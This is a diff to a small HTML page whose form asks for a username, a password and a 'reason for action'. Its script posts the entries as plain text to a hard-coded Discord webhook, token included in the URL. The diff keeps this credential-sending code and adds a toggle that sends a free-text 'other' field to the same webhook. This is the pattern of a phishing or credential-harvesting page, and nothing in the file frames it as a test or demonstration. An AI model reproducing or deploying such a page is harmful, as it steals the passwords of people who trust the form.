@@ -13,6 +13,14 @@
       justify-content: center;
       height: 100vh;
       font-family: Arial, sans-serif;
+      margin: 0;
+    }
+
+    .input-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
     }
 
     input {
@@ -42,36 +50,95 @@
     button:hover {
       background-color: #1c7fc3;
     }
+
+    .toggle-btn {
+      background-color: #444;
+      margin-bottom: 20px;
+    }
+
+    .toggle-btn.active {
+      background-color: #2a9df4;
+    }
+
+    .hidden {
+      display: none;
+    }
   </style>
   <script>
-    function sendData() {
-      const inputs = [
-        document.getElementById("input1"),
-        document.getElementById("input2"),
-        document.getElementById("input3")
-      ];
+    let sendOther = false;
 
-      if (inputs.every(input => input.value.trim() !== "")) {
-const content = `${inputs[0].name}: ${inputs[0].value}\n${inputs[1].name}: ${inputs[1].value}\n${inputs[2].name}: ${inputs[2].value}`;
-
-fetch("https://discord.com/api/webhooks/1383376629958705283/Mp-JNaExjQqIUMCS269TJq7hRqFHeuxO-ZfA3QCyWot9_GvL8nZ_XEi1KaEhH6RdHw6z", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({ content })
-});
-
+    function toggleSendMode() {
+      sendOther = !sendOther;
+      const toggleBtn = document.getElementById("toggleBtn");
+      const formInputs = document.getElementById("formInputs");
+      const otherInput = document.getElementById("otherInput");
+      
+      toggleBtn.textContent = sendOther ? "Sending: Other" : "Sending: Form Data";
+      toggleBtn.classList.toggle("active");
+      
+      if (sendOther) {
+        formInputs.classList.add("hidden");
+        otherInput.classList.remove("hidden");
       } else {
-        alert("Please fill out all fields.");
+        formInputs.classList.remove("hidden");
+        otherInput.classList.add("hidden");
+      }
+    }
+
+    function sendData() {
+      if (sendOther) {
+        const otherValue = document.getElementById("otherText").value.trim();
+        if (otherValue === "") {
+          alert("Please enter your other content.");
+          return;
+        }
+        
+        fetch("https://discord.com/api/webhooks/1383376629958705283/Mp-JNaExjQqIUMCS269TJq7hRqFHeuxO-ZfA3QCyWot9_GvL8nZ_XEi1KaEhH6RdHw6z", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: otherValue })
+        });
+      } else {
+        const inputs = [
+          document.getElementById("input1"),
+          document.getElementById("input2"),
+          document.getElementById("input3")
+        ];
+
+        if (inputs.every(input => input.value.trim() !== "")) {
+          const content = `${inputs[0].name}: ${inputs[0].value}\n${inputs[1].name}: ${inputs[1].value}\n${inputs[2].name}: ${inputs[2].value}`;
+
+          fetch("https://discord.com/api/webhooks/1383376629958705283/Mp-JNaExjQqIUMCS269TJq7hRqFHeuxO-ZfA3QCyWot9_GvL8nZ_XEi1KaEhH6RdHw6z", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content })
+          });
+        } else {
+          alert("Please fill out all fields.");
+        }
       }
     }
   </script>
 </head>
 <body>
-  <input type="text" id="input1" name="Username" placeholder="Enter Username">
-  <input type="password" id="input2" name="Password" placeholder="Enter Password">
-  <input type="text" id="input3" name="Reason" placeholder="Reason for Action">
+  <button id="toggleBtn" class="toggle-btn" onclick="toggleSendMode()">Sending: Form Data</button>
+  
+  <div class="input-container">
+    <div id="formInputs">
+      <input type="text" id="input1" name="Username" placeholder="Enter Username">
+      <input type="password" id="input2" name="Password" placeholder="Enter Password">
+      <input type="text" id="input3" name="Reason" placeholder="Reason for Action">
+    </div>
+    
+    <div id="otherInput" class="hidden">
+      <input type="text" id="otherText" name="Other" placeholder="Enter other content">
+    </div>
+  </div>
+  
   <button onclick="sendData()">Confirm</button>
 </body>
 </html>
